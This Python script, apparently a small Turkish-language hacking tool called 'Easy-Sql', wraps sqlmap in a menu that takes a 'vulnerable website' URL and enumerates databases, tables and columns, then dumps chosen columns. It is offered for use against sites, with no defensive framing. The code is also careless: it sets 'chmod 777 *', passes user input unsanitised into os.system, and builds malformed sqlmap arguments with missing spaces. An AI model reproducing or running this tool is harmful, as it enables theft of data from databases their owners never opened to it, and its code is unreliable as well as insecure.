#!/usr/bin/env python

import os

import colorama

from colorama import Fore, Back, Style

colorama.init()



os.system("clear")

os.system("apt-get install python")

os.system("apt-get install python2")

os.system("apt-get install figlet")

os.system("apt-get install git")

os.system("apt-get install colorama")

os.system("clear")

os.system("figlet easy-sql")



print(" ")

print("")

print("Easy-Sql aracına hoşgeldin!")



print(" ")

print(Back.RED)

print("Coded By alonesqu4d")



print(Style.RESET_ALL)

print(" ")



website = input("Açıklı Web Sitesini Tırnak İşaretleriyle Girin: ")



print(" ")



print("Aşağıdan yapmak istediğiniz işlemi seçiniz.")



print(Fore.RED)

print("""



1-) Veritabanını Çek



2-) Tabloları Çek



3-) Kolonları Çek



4-) Seçtiğin Kolonları Dump Et

""")



print(Style.RESET_ALL)

print(" ")



secim = input("Seçiminiz: ")



os.system("chmod 777 *")



if secim == "1":

	os.system("python2 sqlmap.py -u " + website + " --dbs")





elif secim == "2":

	veritabani = input("Datayı Giriniz: ")

	os.system("python2 sqlmap.py -u " + website + "-D " + veritabani + " --tables")



elif secim == "3":

	veritabani = input("Datayı Giriniz: ")

	tablo = input("Tabloyu Giriniz: ")

	os.system("python2 sqlmap.py -u " + website + "-D " + veritabani + "-T " + tablo + " --columns")



elif secim == "4":

	veritabani = input("Datayı Giriniz: ")

	tablo = input("Tabloyu Giriniz: ")

	kolon = input("Kolonu Giriniz: ")

	os.system("python2 sqlmap.py -u " + website + "-D " + veritabani + "-T " + tablo + " -C" + kolon + " --dump")



else:

	print("Böyle Bir Seçenek Bulunamadı, Araçtan Çıkılıyor!")





